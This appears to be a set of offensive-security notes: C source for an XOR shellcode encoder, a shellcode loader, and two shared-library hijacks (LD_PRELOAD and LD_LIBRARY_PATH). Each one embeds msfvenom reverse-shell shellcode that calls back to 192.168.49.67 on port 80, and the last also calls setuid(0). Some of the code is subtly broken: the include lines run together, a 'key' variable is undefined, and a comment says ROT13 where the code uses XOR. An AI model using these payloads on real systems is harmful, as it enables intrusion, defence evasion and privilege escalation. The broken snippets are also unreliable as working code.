### **Payloads**

### **XOR Payload Encoder**

```c
#include <stdio.h>#include <stdlib.h>#include <unistd.h>// To compile:
// gcc simpleXORencoder.c -o simpleXORencoder

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        printf("XOR payload (key 0xfa):\n");

        for(int i=0; i<buf_len; i++)
        {
                printf("\\x%02X",buf[i]^key);
        }

        return 0;
}

```

### **Simple Loader**

```c
#include <stdio.h>#include <stdlib.h>#include <unistd.h>// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
unsigned char buf[] = "\x90\xD3\xA2\x63\x90\xF8\xA5\x90\xFB\xA4\xF5\xFF\xB2\x6D\xB2\x43\xF8\xFA\xFA\xAA\x3A\x52\xCB\xB9\xAB\xB2\x73\x1C\x90\xEA\xA0\x90\xD0\xA2\xF5\xFF\x90\xF9\xA4\xB2\x05\x34\x90\xDB\xA2\xF5\xFF\x8F\x0C\x90\xC1\xA2\x63\xB2\x41\xD5\x98\x93\x94\xD5\x89\x92\xFA\xA9\xB2\x73\x1D\xA8\xAD\xB2\x73\x1C\xF5\xFF\xFA";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}

```

### **Shared Library LD PRELOAD**

```c
#define _GNU_SOURCE#include <sys/mman.h>#include <stdlib.h>#include <stdio.h>#include <dlfcn.h>#include <unistd.h>// To compile:
// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
// gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

uid_t geteuid(void)
{
        // Get the address of the original 'geteuid' function
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");

        // Fork a new thread based on the current one
        if (fork() == 0)
        {
                // Execute shellcode in the new thread
                intptr_t pagesize = sysconf(_SC_PAGESIZE);

                // Make memory executable (required in libs)
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        // Handle error
                        perror("mprotect");
                        return -1;
                }

                // Cast and execute
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                // Original thread, call the original function
                printf("[Hijacked] Returning from function...\n");
                return (*old_geteuid)();
        }
        // This shouldn't really execute
        printf("[Hijacked] Returning from main...\n");
        return -2;
}

```

### **Shared Library LD LIBRARY Path**

```c
#include <sys/mman.h>#include <stdlib.h>#include <stdio.h>#include <dlfcn.h>#include <unistd.h>// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

// ROT13-encoded 'linux/x64/shell_reverse_tcp' payload
char buf[] = "\x77\x36\x65\xa6\x77\x0f\x6c\x77\x0e\x6b\x1c\x12\x55\xa4\x55\xc6\x0f\x0d\x0d\x5d\xcd\xb5\x3e\x50\x5e\x55\x96\xf3\x77\x1d\x67\x77\x37\x65\x1c\x12\x77\x10\x6b\x55\x0c\xdb\x77\x2e\x65\x1c\x12\x82\x03\x77\x48\x65\xa6\x55\xc8\x3c\x6f\x76\x7b\x3c\x80\x75\x0d\x60\x55\x96\xf4\x5f\x64\x55\x96\xf3\x1c\x12";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}

```
